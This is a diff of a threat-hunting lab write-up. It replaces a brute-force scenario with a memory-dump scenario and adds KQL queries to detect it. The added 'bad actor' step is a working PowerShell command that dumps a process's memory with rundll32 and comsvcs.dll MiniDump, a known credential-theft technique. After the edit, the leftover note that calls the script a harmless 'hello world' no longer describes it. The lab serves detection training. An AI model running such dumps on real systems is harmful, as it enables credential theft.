@@ -8,24 +8,16 @@ A standard user, who was recently hired, works from home and was flagged by admi
 ---
 
 ## IoC Discovery Plan:
-1. Check DeviceLogonEvents for any signs of brute force attempts
-2. Check DeviceFileEvents for any signs file installations and/or file deletions
-3. Check DeviceProcessEvents for any signs powershell usage
+1. Check DeviceProcessEvents for the Windows utilities ```rundll32.exe``` and ```comsvcs.dll```
+2. Check DeviceFileEvents for the ```svchost-exe.dmp``` dump file
 
 ---
 ## Steps Taken by Bad Actor
-1. Attempt to brute force the password in RDP with incorrect credentials
-2. Successfully log in
-3. Execute Malicious Powershell script: 
+1. Execute Malicious Powershell script: 
 ```
-powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGUAbABsAG8AIAB3AG8AcgBsAGQ=
-
-# Define the URL and the destination path
-$url = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%2Fid%2FOIP.D_2umvMRIihretglyFNrlwHaEK%3Fr%3D0%26pid%3DApi&f=1&ipt=c3186ebe04803f74c7321aa6f7a1ddc64ab70f005e924506bd045c0c41df2737&ipo=images"
-$output = "C:\Users\thanos\Downloads\image.jpg"
-
-# Download the image
-Invoke-WebRequest -Uri $url -OutFile $output
+$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
+if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
 ```
 5. Delete powershell script 
 Note: Of course these actions are harmless for the purpose of the lab. The "malicious powershell script" prints "hello world" to the screen and the downloads an image of a tree.
@@ -36,9 +28,10 @@ Note: Of course these actions are harmless for the purpose of the lab. The "mali
 
 1. First look for logon failures using the following query (I narrowed down the results by entering in the DeviceName):
 ```kql
-DeviceLogonEvents
+DeviceProcessEvents
 | where DeviceName == "rojas-admin"
-| where ActionType == "LogonFailed"
+| where FileName == "rundll32.exe"
+| where ProcessCommandLine contains "comsvcs.dll"
 ```
 The following events results were displayed:
 <img width="1402" height="289" alt="image" src="https://github.com/user-attachments/assets/ce9cee7f-8b95-40a6-9949-a29bf8ec68ec" />
